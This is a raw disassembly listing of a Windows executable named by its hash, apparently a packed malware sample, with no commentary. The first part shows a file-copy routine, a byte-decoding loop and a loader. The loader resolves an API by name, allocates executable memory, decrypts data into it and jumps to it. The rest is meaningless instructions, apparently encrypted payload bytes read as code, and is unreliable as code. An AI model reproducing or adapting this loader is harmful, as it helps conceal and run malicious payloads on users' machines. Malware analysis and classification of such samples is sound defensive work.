
cda1646156e1514310a0e7a3f4e1d3889d136000a8bc21e9ae8729c2339d15e7.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x429228
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x429220
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429050
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429074
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429078
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x429080
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x42907c
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429084
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42908c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429154
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291e8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x4291c0
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429190
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429168
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  ecx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    edx,DWORD PTR [esp+0x10]
  4111a9:	mov    eax,DWORD PTR [esp+0x14]
  4111ad:	add    edx,eax
  4111af:	mov    DWORD PTR [esp+0x10],edx
  4111b3:	ror    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    edx,eax
  4111bb:	shr    edx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,edx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	add    bl,cl
  4111d4:	mov    ecx,DWORD PTR [esp+0x24]
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x58],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x54],0x0
  41120b:	mov    DWORD PTR [ebp-0x4c],0x0
  411212:	mov    DWORD PTR [ebp-0x70],0x0
  411219:	mov    DWORD PTR [ebp-0x60],0x0
  411220:	mov    DWORD PTR [ebp-0x8],0x0
  411227:	mov    DWORD PTR [ebp-0x50],0x0
  41122e:	mov    DWORD PTR [ebp-0x48],0x0
  411235:	mov    DWORD PTR [ebp-0x6c],0x0
  41123c:	mov    DWORD PTR [ebp-0x30],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x2c],0x0
  411251:	mov    DWORD PTR [ebp-0x14],0x0
  411258:	mov    DWORD PTR [ebp-0x10],0x0
  41125f:	mov    DWORD PTR [ebp-0x68],0x0
  411266:	mov    DWORD PTR [ebp-0x5c],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429254
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429258
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42925c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429260
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429244
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429248
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42924c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429250
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429252
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	push   0xa
  4112cd:	call   DWORD PTR ds:0x429158
  4112d3:	lea    eax,[ebp-0x10]
  4112d6:	push   eax
  4112d7:	push   0x429230
  4112dc:	call   DWORD PTR ds:0x429004
  4112e2:	test   eax,eax
  4112e4:	je     0x41133c
  4112e6:	push   0x0
  4112e8:	push   0x0
  4112ea:	push   0x0
  4112ec:	call   DWORD PTR ds:0x429040
  4112f2:	mov    DWORD PTR [ebp-0x14],eax
  4112f5:	lea    ecx,[ebp-0x40]
  4112f8:	push   ecx
  4112f9:	lea    edx,[ebp-0x10]
  4112fc:	push   edx
  4112fd:	call   DWORD PTR ds:0x429000
  411303:	test   eax,eax
  411305:	je     0x41133c
  411307:	push   0x108a
  41130c:	push   0x3873f
  411311:	call   DWORD PTR ds:0x42903c
  411317:	mov    eax,DWORD PTR [ebp-0x10]
  41131a:	add    eax,0x1
  41131d:	mov    DWORD PTR [ebp-0x10],eax
  411320:	push   0x14
  411322:	push   0x0
  411324:	mov    ecx,DWORD PTR [ebp-0x14]
  411327:	push   ecx
  411328:	call   DWORD PTR ds:0x429038
  41132e:	push   0x0
  411330:	push   0x0
  411332:	mov    edx,DWORD PTR [ebp-0x14]
  411335:	push   edx
  411336:	call   DWORD PTR ds:0x429034
  41133c:	mov    BYTE PTR [ebp-0x40],0x56
  411340:	call   DWORD PTR ds:0x429030
  411346:	mov    DWORD PTR [ebp-0x2c],eax
  411349:	mov    BYTE PTR [ebp-0x3e],0x72
  41134d:	movzx  eax,WORD PTR [ebp-0x2c]
  411351:	cmp    eax,0x539
  411356:	jne    0x4113a4
  411358:	mov    BYTE PTR [ebp-0x34],0x0
  41135c:	mov    DWORD PTR [ebp-0x14],0xe0d
  411363:	lea    ecx,[ebp-0x28]
  411366:	push   ecx
  411367:	call   DWORD PTR ds:0x42902c
  41136d:	mov    DWORD PTR [ebp-0x60],eax
  411370:	mov    DWORD PTR [ebp-0x54],0x3a
  411377:	lea    edx,[ebp-0x40]
  41137a:	push   edx
  41137b:	mov    eax,DWORD PTR [ebp-0x60]
  41137e:	push   eax
  41137f:	call   DWORD PTR ds:0x429028
  411385:	mov    DWORD PTR [ebp-0x44],eax
  411388:	mov    DWORD PTR [ebp-0x8],0x8b244ff5
  41138f:	push   0x0
  411391:	mov    ecx,DWORD PTR [ebp-0x70]
  411394:	push   ecx
  411395:	call   DWORD PTR ds:0x429014
  41139b:	mov    DWORD PTR [ebp-0x6c],0x110e87
  4113a2:	jmp    0x4113c5
  4113a4:	mov    BYTE PTR ds:0x448090,0x0
  4113ab:	mov    BYTE PTR ds:0x42e210,0x0
  4113b2:	push   0x0
  4113b4:	mov    edx,DWORD PTR [ebp-0x70]
  4113b7:	push   edx
  4113b8:	call   DWORD PTR ds:0x42914c
  4113be:	mov    BYTE PTR ds:0x446060,0x0
  4113c5:	push   DWORD PTR ds:0x42902c
  4113cb:	pop    edx
  4113cc:	mov    DWORD PTR [ebp-0x68],edx
  4113cf:	push   DWORD PTR [ebp-0x30]
  4113d2:	push   0x1000
  4113d7:	mov    eax,DWORD PTR [ebp-0x14]
  4113da:	add    eax,0x23
  4113dd:	add    eax,0x23
  4113e0:	push   eax
  4113e1:	xor    eax,eax
  4113e3:	push   eax
  4113e4:	mov    ecx,DWORD PTR [ebp-0x44]
  4113e7:	call   ecx
  4113e9:	push   eax
  4113ea:	pop    ecx
  4113eb:	mov    DWORD PTR [ebp-0x4],ecx
  4113ee:	mov    eax,DWORD PTR [ebp-0x6c]
  4113f1:	sub    eax,0xdae0b
  4113f6:	mov    DWORD PTR [ebp-0x6c],eax
  4113f9:	cmp    DWORD PTR [ebp-0x4],0x0
  4113fd:	jne    0x41140e
  4113ff:	push   0x0
  411401:	call   DWORD PTR ds:0x42900c
  411407:	mov    BYTE PTR ds:0x446060,0x0
  41140e:	mov    ecx,DWORD PTR [ebp-0x4]
  411411:	add    ecx,DWORD PTR [ebp-0x14]
  411414:	mov    edx,DWORD PTR [ebp-0x8]
  411417:	mov    DWORD PTR [ecx],edx
  411419:	mov    DWORD PTR [ebp-0x2c],0x410000
  411420:	mov    eax,DWORD PTR [ebp-0x60]
  411423:	push   eax
  411424:	call   DWORD PTR ds:0x429024
  41142a:	mov    ecx,DWORD PTR [ebp-0x4]
  41142d:	add    ecx,DWORD PTR [ebp-0x54]
  411430:	mov    DWORD PTR [ebp-0x5c],ecx
  411433:	mov    edx,DWORD PTR ds:0x429028
  411439:	mov    DWORD PTR [ebp-0x4c],edx
  41143c:	mov    eax,DWORD PTR [ebp-0x4]
  41143f:	add    eax,DWORD PTR [ebp-0x14]
  411442:	mov    ecx,DWORD PTR [ebp+0x8]
  411445:	mov    DWORD PTR [eax+0x4],ecx
  411448:	mov    edx,DWORD PTR [ebp-0x4]
  41144b:	add    edx,DWORD PTR [ebp-0x14]
  41144e:	mov    DWORD PTR [ebp-0xc],edx
  411451:	mov    eax,DWORD PTR [ebp-0x70]
  411454:	push   eax
  411455:	call   DWORD PTR ds:0x429150
  41145b:	cmp    DWORD PTR [ebp-0x6c],0x0
  41145f:	jbe    0x41147c
  411461:	mov    ecx,DWORD PTR [ebp-0xc]
  411464:	push   ecx
  411465:	mov    edx,DWORD PTR [ebp-0x14]
  411468:	push   edx
  411469:	mov    eax,DWORD PTR [ebp-0x2c]
  41146c:	add    eax,DWORD PTR [ebp-0x6c]
  41146f:	push   eax
  411470:	mov    ecx,DWORD PTR [ebp-0x4]
  411473:	push   ecx
  411474:	call   0x411170
  411479:	add    esp,0x10
  41147c:	call   DWORD PTR ds:0x429020
  411482:	cmp    DWORD PTR [ebp-0x5c],0x0
  411486:	je     0x411499
  411488:	push   DWORD PTR [ebp-0x4c]
  41148b:	push   DWORD PTR [ebp-0x68]
  41148e:	mov    edx,DWORD PTR [ebp-0x5c]
  411491:	push   eax
  411492:	jmp    edx
  411494:	jmp    0x422f7a
  411499:	mov    edx,DWORD PTR [ebp+0x8]
  41149c:	mov    DWORD PTR [ebp-0x18],edx
  41149f:	push   0x1
  4114a1:	mov    eax,DWORD PTR [ebp-0x70]
  4114a4:	push   eax
  4114a5:	call   DWORD PTR ds:0x429010
  4114ab:	pop    ds
  4114ac:	sbb    BYTE PTR [edi+0x3c],cl
  4114af:	and    bh,dh
  4114b1:	retf   
  4114b2:	addr16 push eax
  4114b4:	cwde   
  4114b5:	es push 0x36
  4114b8:	cwde   
  4114b9:	rol    BYTE PTR [esi-0x39],1
  4114bc:	jno    0x41144b
  4114be:	xor    edi,esp
  4114c0:	jp     0x411454
  4114c2:	(bad)  
  4114c3:	popa   
  4114c4:	mov    bl,0x3
  4114c6:	xchg   esi,eax
  4114c7:	pushf  
  4114c8:	dec    eax
  4114c9:	mov    DWORD PTR [esi+ebp*1+0x3c],ecx
  4114cd:	add    dh,BYTE PTR [edi]
  4114cf:	inc    edx
  4114d0:	lock dec esp
  4114d2:	fsubr  st(7),st
  4114d4:	mov    ch,0xeb
  4114d6:	lea    ebx,[ebx]
  4114d8:	dec    ecx
  4114d9:	cmp    edi,DWORD PTR [ebp+0x47]
  4114dc:	imul   eax,DWORD PTR [edx],0x16
  4114df:	sub    BYTE PTR [edx-0x12705b02],bh
  4114e5:	nop
  4114e6:	mov    esp,ebx
  4114e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114e9:	pop    ebp
  4114ea:	pushf  
  4114eb:	xchg   ebx,eax
  4114ec:	and    BYTE PTR [edx-0x51],bh
  4114ef:	pushf  
  4114f0:	jle    0x4114fc
  4114f2:	jnp    0x718cb97a
  4114f8:	imul   esi,DWORD PTR [edx+edx*1+0x4807afc],0x6bc83b9e
  411503:	(bad)  
  411504:	pushf  
  411505:	mov    edi,0x2727d203
  41150a:	iret   
  41150b:	jb     0x411494
  41150d:	sub    eax,DWORD PTR [edx-0x16ddbeb7]
  411513:	(bad)  
  411514:	dec    edi
  411515:	pop    ss
  411516:	jo     0x41155a
  411518:	xor    edi,ebp
  41151a:	jl     0x4114b6
  41151c:	dec    esp
  41151d:	rcr    BYTE PTR [edi-0x158a4a7e],0xd2
  411524:	add    BYTE PTR [eax+eax*1+0xabd3e60],ah
  41152b:	jnp    0x4114f6
  41152d:	nop
  41152e:	mov    esi,0x6f8f93fb
  411533:	cmp    eax,0x97681a04
  411538:	dec    ecx
  411539:	push   es
  41153a:	inc    esp
  41153b:	out    dx,eax
  41153c:	pop    edi
  41153d:	imul   ebx,DWORD PTR [edi+edi*8+0xe406c23],0xe7aea537
  411548:	(bad)  
  411549:	pop    ecx
  41154a:	lea    esp,[esi-0x6505e5c1]
  411550:	mov    DWORD PTR [ebx+esi*2],edi
  411553:	push   edi
  411554:	mov    bh,BYTE PTR [ecx]
  411556:	in     al,0xd6
  411558:	cld    
  411559:	sbb    bh,BYTE PTR [esi-0x2e]
  41155c:	jne    0x4115d6
  41155e:	sbb    ebp,DWORD PTR [ebx]
  411560:	fnstcw WORD PTR [ecx]
  411562:	fnsave [ebp+0x45865c50]
  411568:	and    eax,0x1f3234be
  41156d:	xor    al,0x44
  41156f:	push   ecx
  411570:	ja     0x41152f
  411572:	xlat   BYTE PTR ds:[ebx]
  411573:	and    ebp,DWORD PTR [eax]
  411575:	int    0xd3
  411577:	xchg   esp,eax
  411578:	mov    ds:0x6f6ee5ae,eax
  41157d:	lahf   
  41157e:	icebp  
  41157f:	sbb    ecx,DWORD PTR [eax-0x6a]
  411582:	mov    esi,cr1
  411585:	adc    ecx,edi
  411587:	lods   al,BYTE PTR ds:[esi]
  411588:	rcr    BYTE PTR [edi+ecx*4-0x71499824],cl
  41158f:	xlat   BYTE PTR ds:[ebx]
  411590:	add    ah,bh
  411592:	call   0x1c1da1b1
  411597:	adc    bh,BYTE PTR [esi-0x17b2bf47]
  41159d:	push   cs
  41159e:	jne    0x4115df
  4115a0:	push   cs
  4115a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115a2:	repz shr DWORD PTR [edi-0x24],0x50
  4115a7:	pop    eax
  4115a8:	xchg   ebx,eax
  4115a9:	sti    
  4115aa:	xchg   BYTE PTR [esi],ch
  4115ac:	out    0x72,al
  4115ae:	dec    ebx
  4115af:	xor    esp,DWORD PTR [eax-0x6577653f]
  4115b5:	imul   esp,DWORD PTR [eax+0x35],0xaeba4f56
  4115bc:	mov    ebx,0x5fe1b1ac
  4115c1:	les    esi,FWORD PTR [ecx-0x5fbdf4c9]
  4115c7:	sti    
  4115c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115c9:	jg     0x411627
  4115cb:	mov    al,ds:0xdde66576
  4115d0:	jne    0x41158e
  4115d2:	mov    edi,0x6516c2a6
  4115d7:	lods   eax,DWORD PTR ds:[esi]
  4115d8:	mov    ebp,?
  4115da:	jo     0x411656
  4115dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115dd:	mov    BYTE PTR [ecx-0x20],dh
  4115e0:	sti    
  4115e1:	std    
  4115e2:	call   0xa00219de
  4115e7:	xor    ah,BYTE PTR [edi+0xe]
  4115ea:	dec    BYTE PTR [esi+0x3cdf9742]
  4115f0:	cmp    edi,0x1da3610a
  4115f6:	addr16 pop edx
  4115f8:	outs   dx,BYTE PTR ds:[esi]
  4115f9:	stos   BYTE PTR es:[edi],al
  4115fa:	dec    ebx
  4115fb:	pop    esp
  4115fc:	xchg   ebp,eax
  4115fd:	(bad)  
  4115fe:	ins    DWORD PTR es:[edi],dx
  4115ff:	sub    eax,0x4092a2cc
  411604:	or     al,BYTE PTR [ecx+esi*2]
  411607:	and    eax,0x9382b653
  41160c:	cmp    eax,DWORD PTR [ecx-0x54306903]
  411612:	pop    ecx
  411613:	arpl   WORD PTR [edi+edx*8],sp
  411616:	xor    edi,DWORD PTR [eax]
  411618:	call   0x47b1:0xe8a6b3b1
  41161f:	ds dec ebx
  411621:	int3   
  411622:	bound  ecx,QWORD PTR [eax+0x6c]
  411625:	fisub  WORD PTR [ecx+0x4548d5be]
  41162b:	or     al,0x61
  41162d:	popf   
  41162e:	loope  0x41169c
  411630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411631:	paddq  mm6,QWORD PTR [edi]
  411634:	dec    eax
  411635:	jl     0x41160e
  411637:	test   BYTE PTR [esp+ecx*1-0x2c],dl
  41163b:	fcom   QWORD PTR [edi+0x1b24448]
  411641:	and    eax,0x612f44e4
  411646:	jg     0x411632
  411648:	clc    
  411649:	repnz dec esp
  41164b:	pop    esp
  41164c:	loop   0x4116b1
  41164e:	sbb    DWORD PTR [ebp-0x52],eax
  411651:	in     eax,dx
  411652:	jnp    0x411664
  411654:	mov    BYTE PTR [ebp-0x31],0x9d
  411658:	ror    ecx,1
  41165a:	mov    es:0xaef2e346,eax
  411660:	cwde   
  411661:	push   0x1e
  411663:	adc    BYTE PTR [edi+esi*4+0x63],0x99
  411668:	nop
  411669:	xchg   al,cl
  41166b:	push   0x7e
  41166d:	dec    ebp
  41166e:	or     esp,DWORD PTR [edx-0x3b]
  411671:	add    eax,0x450f65d2
  411676:	cmp    eax,0x6d934aa6
  41167b:	adc    cl,BYTE PTR ds:[edi-0x1e]
  41167f:	int3   
  411680:	adc    DWORD PTR [esi+0x34],0x84d151c2
  411687:	mov    ds:0x522b3193,eax
  41168c:	mov    dl,BYTE PTR [edx+0x6a]
  41168f:	les    esi,FWORD PTR [esi-0x5e]
  411692:	shr    BYTE PTR [ebp-0x3c],cl
  411695:	sbb    dh,BYTE PTR [ebx-0x6f]
  411698:	xor    al,0xe
  41169a:	scas   al,BYTE PTR es:[edi]
  41169b:	xchg   ebp,eax
  41169c:	sbb    dl,cl
  41169e:	mov    edx,0x996bc5e8
  4116a3:	clc    
  4116a4:	fsub   QWORD PTR [ebp-0x35]
  4116a7:	mov    ebx,0x9edcee80
  4116ac:	jbe    0x4116dc
  4116ae:	jecxz  0x4116fd
  4116b0:	sub    BYTE PTR [edi+0x2f],0x92
  4116b4:	or     DWORD PTR [edi],ecx
  4116b6:	outs   dx,BYTE PTR ds:[esi]
  4116b7:	aad    0xf3
  4116b9:	push   ebp
  4116ba:	cdq    
  4116bb:	mov    al,BYTE PTR [esi-0x5f2a7d8e]
  4116c1:	(bad)
  4116c4:	shl    DWORD PTR [eax-0xa6a2936],cl
  4116ca:	pushf  
  4116cb:	rcl    DWORD PTR [esi+0x1489668f],0x83
  4116d2:	push   es
  4116d3:	sub    DWORD PTR [edx],edx
  4116d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116d6:	add    ecx,DWORD PTR [edx+eax*4+0x7e]
  4116da:	pop    ss
  4116db:	rcl    ah,0x99
  4116de:	and    al,BYTE PTR [di+0x1b]
  4116e2:	std    
  4116e3:	ins    BYTE PTR es:[edi],dx
  4116e4:	mov    eax,0xa041b349
  4116e9:	pushf  
  4116ea:	nop
  4116eb:	les    edx,FWORD PTR [eax-0x3e6f581e]
  4116f1:	dec    ebx
  4116f2:	loope  0x411679
  4116f4:	call   0x4d60:0xf586be1
  4116fb:	xor    cl,al
  4116fd:	and    DWORD PTR [esi+0x6a],ebx
  411700:	sti    
  411701:	ins    DWORD PTR es:[edi],dx
  411702:	stos   DWORD PTR es:[edi],eax
  411703:	test   al,0x2a
  411705:	jb     0x41168d
  411707:	cmp    bh,dh
  411709:	cmc    
  41170a:	xor    eax,edi
  41170c:	ret    
  41170d:	sti    
  41170e:	lods   al,BYTE PTR ds:[esi]
  41170f:	fcom   DWORD PTR [eax]
  411711:	(bad)  
  411712:	pop    ss
  411713:	pop    ecx
  411714:	leave  
  411715:	xchg   esi,eax
  411716:	cmp    DWORD PTR [edi-0x54d9188c],ebx
  41171c:	into   
  41171d:	shr    BYTE PTR [ecx],cl
  41171f:	retf   
  411720:	jl     0x411726
  411722:	fwait
  411723:	or     BYTE PTR [ebp+0x104df586],al
  411729:	inc    ecx
  41172a:	add    BYTE PTR [edx-0x16efdeaf],bl
  411730:	push   0x20
  411732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411733:	ret    
  411734:	jno    0x4117aa
  411736:	js     0x41174f
  411738:	in     eax,0xa1
  41173a:	scas   al,BYTE PTR es:[edi]
  41173b:	mov    ch,0x1a
  41173d:	mov    BYTE PTR [ebx-0x4c],ah
  411740:	pop    esi
  411741:	mov    eax,0xf0c1664b
  411746:	jns    0x411768
  411748:	daa    
  411749:	daa    
  41174a:	jmp    0xeb7b:0xcf940f21
  411751:	or     esi,ebp
  411753:	fcom   DWORD PTR [edi]
  411755:	cld    
  411756:	fcom   DWORD PTR [ecx-0x5c]
  411759:	dec    esp
  41175a:	dec    edi
  41175b:	cdq    
  41175c:	cwde   
  41175d:	jecxz  0x4117c4
  41175f:	push   edx
  411760:	mov    dl,0xfa
  411762:	(bad)
  411765:	cmp    DWORD PTR [esp+eiz*8],ebp
  411768:	mov    ah,0x36
  41176a:	pop    edx
  41176b:	test   al,0x4d
  41176d:	and    eax,DWORD PTR [esi+0x7f]
  411770:	cmp    al,0xfa
  411772:	jp     0x41172c
  411774:	adc    BYTE PTR [edi-0x76],bh
  411777:	push   ds
  411778:	mov    bh,0x6e
  41177a:	out    0x39,eax
  41177c:	in     eax,0x7c
  41177e:	dec    ebp
  41177f:	mov    ebx,0xfb364b4a
  411784:	mov    ah,0x29
  411786:	daa    
  411787:	and    BYTE PTR [ecx-0x2b],al
  41178a:	aaa    
  41178b:	push   esp
  41178c:	sbb    BYTE PTR [ebp-0x77],ah
  41178f:	jno    0x41176f
  411791:	fs out dx,eax
  411793:	hlt    
  411794:	mov    esi,0x57652825
  411799:	out    0xf,eax
  41179b:	imul   eax,DWORD PTR [edx-0x5a],0x7f
  41179f:	lds    esi,FWORD PTR [edi]
  4117a1:	or     cl,dl
  4117a3:	in     eax,dx
  4117a4:	push   0xffffffce
  4117a6:	pop    ds
  4117a7:	inc    edx
  4117a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117a9:	sbb    DWORD PTR [ecx+0xc],edx
  4117ac:	mov    eax,ds:0x9fd06599
  4117b1:	cmovle eax,DWORD PTR [edx]
  4117b4:	inc    esp
  4117b5:	retf   0xeb0a
  4117b8:	callw  0x818c
  4117bc:	dec    eax
  4117bd:	ins    BYTE PTR es:[edi],dx
  4117be:	daa    
  4117bf:	rcr    DWORD PTR [ebp+0xfb62643],cl
  4117c5:	inc    esi
  4117c6:	push   es
  4117c7:	jnp    0x411815
  4117c9:	inc    esp
  4117ca:	ret    
  4117cb:	hlt    
  4117cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117cd:	xchg   esi,eax
  4117ce:	sub    dl,BYTE PTR [eax-0x2559d07d]
  4117d4:	daa    
  4117d5:	or     BYTE PTR ds:0x52f81572,cl
  4117db:	test   eax,0xc64dcc53
  4117e0:	mov    esp,0x938b836
  4117e5:	jg     0x411811
  4117e7:	and    BYTE PTR [eax],bh
  4117e9:	xchg   dl,bl
  4117eb:	int    0xe2
  4117ed:	(bad)  
  4117ee:	shl    BYTE PTR [esi+0x21],1
  4117f1:	mov    al,0x84
  4117f3:	pop    ecx
  4117f4:	addr16 pop edi
  4117f6:	je     0x41186d
  4117f8:	adc    eax,0x381259f4
  4117fd:	(bad)  
  4117fe:	idiv   DWORD PTR [ebp+0x5e]
  411801:	mov    eax,0x10a8854
  411806:	mov    edi,0xa6cbc1ac
  41180b:	dec    edi
  41180c:	dec    edi
  41180d:	jmp    0x4117d8
  41180f:	not    DWORD PTR [edx-0x2c3fc09f]
  411815:	ffreep st(7)
  411817:	xchg   BYTE PTR [eax],ah
  411819:	inc    edx
  41181a:	(bad)  
  41181b:	cmp    edx,DWORD PTR [ebp-0x65a94084]
  411821:	sbb    al,al
  411823:	or     dh,BYTE PTR [ecx-0x3e]
  411826:	adc    eax,0x17446831
  41182b:	add    al,0x55
  41182d:	ret    
  41182e:	(bad)  
  411830:	cld    
  411831:	add    eax,0x4064d659
  411836:	dec    ebx
  411838:	rol    DWORD PTR [edi+0x2],0xd8
  41183c:	scas   al,BYTE PTR es:[edi]
  41183d:	call   0xccc4:0x21588b16
  411844:	sub    ch,bl
  411846:	arpl   bx,si
  411848:	(bad)  
  411849:	push   ebp
  41184a:	push   eax
  41184b:	clc    
  41184c:	test   BYTE PTR [edx],bh
  41184e:	clc    
  41184f:	cmp    DWORD PTR [ecx+0x12],edx
  411852:	push   edi
  411853:	test   eax,0x2207421d
  411858:	adc    DWORD PTR [esi+0x758f25a],edi
  41185e:	xor    ebp,DWORD PTR [eax+eiz*8-0x27]
  411862:	arpl   WORD PTR [ebp+0x6f028fea],si
  411868:	add    eax,0xc25c9727
  41186d:	outs   dx,DWORD PTR ds:[esi]
  41186e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41186f:	mov    ah,0x2a
  411871:	adc    BYTE PTR [eax-0x24cf52c5],dh
  411877:	xchg   BYTE PTR [esi-0x12],ch
  41187a:	jge    0x41189b
  41187c:	clc    
  41187d:	ret    0xd979
  411880:	inc    edi
  411881:	pop    ds
  411882:	mov    ds:0x6a3134f,eax
  411887:	sbb    edi,DWORD PTR [ebx]
  411889:	xchg   ebp,eax
  41188a:	xor    ebx,DWORD PTR [eax+esi*2-0x57331948]
  411891:	cld    
  411892:	sbb    bl,BYTE PTR [ebx+0x2f]
  411895:	imul   ebp,ebp,0xd3029b04
  41189b:	shl    BYTE PTR [ebx-0x2b65464a],cl
  4118a1:	rol    BYTE PTR [ecx],0x8b
  4118a4:	in     eax,dx
  4118a5:	imul   ebp,DWORD PTR [ecx-0x33687bd6],0x474bdcf6
  4118af:	mov    edi,0x5e22d2ff
  4118b4:	mov    ch,0x9b
  4118b6:	xor    ecx,eax
